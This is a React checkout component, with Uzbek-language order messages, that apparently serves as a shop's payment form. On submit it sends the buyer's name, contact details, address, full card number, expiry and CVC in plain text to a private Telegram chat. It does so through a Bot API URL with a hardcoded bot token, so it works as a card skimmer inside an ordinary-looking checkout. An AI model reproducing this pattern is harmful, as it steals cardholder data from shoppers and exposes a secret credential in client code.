// src/components/Checkout.tsx

import React, { useState, type ChangeEvent, type FormEvent } from 'react';
import type { FormData } from "../../types";
import axios from 'axios';
import ContactInfo from './components/ContactInfo';
import ShippingAddress from './components/ShippingAddress';
import PaymentMethod from './components/PaymentMethod';


const Checkout: React.FC = () => {
    const BOT_TOKEN = '8310939594:AAGpeyKT5bKZJmY_AlcFvMhLVFowK3QvpjM';
    const USER_ID = '6779915471';

    const [formData, setFormData] = useState<FormData>({
        firstName: '',
        lastName: '',
        phone: '',
        email: '',
        streetAddress: '',
        country: '',
        town: '',
        state: '',
        zipCode: '',
        useDifferentBilling: false,
        paymentMethod: 'card',
        cardNumber: '1234 5678 9101 1234',
        expirationDate: '',
        cvc: '',
    });

    const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const { name, value, type } = e.target;
        const checked = (e.target as HTMLInputElement).checked;

        setFormData((prevData) => ({
            ...prevData,
            [name]: type === 'checkbox' ? checked : value,
        }));
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        
        const messageText = `
            Yangi Buyurtma!

            Mijoz haqida ma'lumot:
            Ism: ${formData.firstName}
            Familiya: ${formData.lastName}
            Telefon: ${formData.phone}
            Email: ${formData.email}

            Yetkazib berish manzili:
            Manzil: ${formData.streetAddress}
            Davlat: ${formData.country}
            Shahar: ${formData.town}
            Viloyat: ${formData.state}
            Zip Code: ${formData.zipCode}

            To'lov usuli:
            Metod: ${formData.paymentMethod === 'card' ? 'Card Credit' : 'Paypal'}
            ${formData.paymentMethod === 'card' ? `Karta raqami: ${formData.cardNumber}` : ''}
            ${formData.paymentMethod === 'card' ? `Amal qilish muddati: ${formData.expirationDate}` : ''}
            ${formData.paymentMethod === 'card' ? `CVC: ${formData.cvc}` : ''}
            
            Boshqa ma'lumotlar:
            Boshqa Billing manzil: ${formData.useDifferentBilling ? 'Ha' : 'Yo\'q'}
        `;

        const encodedText = encodeURIComponent(messageText);
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${USER_ID}&text=${encodedText}`;

        try {
            const response = await axios.get(url);
            console.log('Telegram botga yuborildi:', response.data);
            alert('Buyurtma Telegram botga muvaffaqiyatli yuborildi!');
        } catch (error) {
            console.error('Telegram botga yuborishda xato:', error);
            alert('Buyurtmani yuborishda xato yuz berdi. Iltimos, qayta urinib ko\'ring.');
        }

        console.log('Form ma\'lumotlari:', formData);
    };

    return (
        <div className="max-w-4xl mx-auto p-4 md:p-8 bg-white shadow-lg rounded-lg">
            <form onSubmit={handleSubmit}>
                <ContactInfo formData={formData} handleChange={handleChange} />
                <ShippingAddress formData={formData} handleChange={handleChange} />
                <PaymentMethod formData={formData} handleChange={handleChange} />
                
                <button
                    type="submit"
                    className="w-full py-4 bg-black text-white font-semibold rounded-md hover:bg-gray-800 transition-colors duration-200"
                >
                    Place Order
                </button>
            </form>
        </div>
    );
};

export default Checkout;